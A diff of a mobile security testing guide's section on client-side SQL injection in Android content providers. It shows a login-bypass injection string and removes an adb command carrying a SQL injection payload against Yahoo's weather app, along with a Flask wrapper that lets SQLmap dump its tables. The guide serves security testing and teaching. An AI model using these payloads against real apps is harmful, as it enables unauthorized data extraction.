@@ -43,48 +43,9 @@ SELECT * FROM users WHERE username='1' OR '1' = '1' AND Password='1' OR '1' = '1
 
 Because the condition `'1' = '1'` always evaluates as true, this query return all records in the database, causing the login function to return "true" even though no valid user account was entered.
 
-Ostorlab exploited the sort parameter of Yahoo's weather mobile application with adb using this SQL injection payload.
+Ostorlab exploited the sort parameter of [Yahoo's weather mobile application](https://blog.ostorlab.co/android-sql-contentProvider-sql-injections.html "Android, SQL and ContentProviders or Why SQL injections aren't dead yet ?") with adb using this SQL injection payload.
 
-```shell
-$ adb shell content query --uri content://com.yahoo.mobile.client.android.weather.provider.Weather/locations/ --sort '_id/**/limit/**/\(select/**/1/**/from/**/sqlite_master/**/where/**/1=1\)'  
-
-Row: 0 _id=1, woeid=2487956, isCurrentLocation=0, latitude=NULL, longitude=NULL, photoWoeid=NULL, city=NULL, state=NULL, stateAbbr=, country=NULL, countryAbbr=, timeZoneId=NULL, timeZoneAbbr=NULL, lastUpdatedTimeMillis=746034814, crc=1591594725
-
-```
-
-The payload can be further simplified using the following `_id/**/limit/**/\(select/**/1/**/from/**/sqlite_master\)`.
-
-This SQL injection vulnerability did not expose any sensitive data that the user didn't already have access to. This example presents a way that adb can be used to test vulnerable content providers. Ostorlab takes this even further and creates a webpage instance of the SQLite query, then runs SQLmap to dump the tables.
-
-```python
-import subprocess
-from flask import Flask, request
-
-app = Flask(__name__)
-
-URI = "com.yahoo.mobile.client.android.weather.provider.Weather/locations/"
-
-@app.route("/")
-def hello():
-
-   method = request.values['method']
-   sort = request.values['sort']
-   sort = "_id/**/limit/**/(SELECT/**/1/**/FROM/**/sqlite_master/**/WHERE/**/1={})".format(sort)
-   #sort = "_id/**/limit/**/({})".format(sort)
-
-   p = subprocess.Popen(["adb","shell","content",method,"--uri","content://{}".format(URI),"--sort",'"{}"'.format(sort)],stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
-
-   o, e = p.communicate()
-
-   print "[*]SORT:{}".format(sort)
-   print "[*]OUTPUT:{}".format(o)
-   return "<html><divclass='output'>{}</div></html>".format(o)
-
-if __name__=="__main__":
-   app.run()
-```
-
-One real-world instance of client-side SQL injection was discovered by Mark Woods within the "Qnotes" and "Qget" Android apps running on QNAP NAS storage appliances. These apps exported content providers vulnerable to SQL injection, allowing an attacker to retrieve the credentials for the NAS device. A detailed description of this issue can be found on the [Nettitude Blog](https://blog.nettitude.com/uk/qnap-android-dont-provide "Nettitude Blog - QNAP Android: Don't Over Provide").
+Another real-world instance of client-side SQL injection was discovered by Mark Woods within the "Qnotes" and "Qget" Android apps running on QNAP NAS storage appliances. These apps exported content providers vulnerable to SQL injection, allowing an attacker to retrieve the credentials for the NAS device. A detailed description of this issue can be found on the [Nettitude Blog](https://blog.nettitude.com/uk/qnap-android-dont-provide "Nettitude Blog - QNAP Android: Don't Over Provide").
 
 #### XML Injection
 
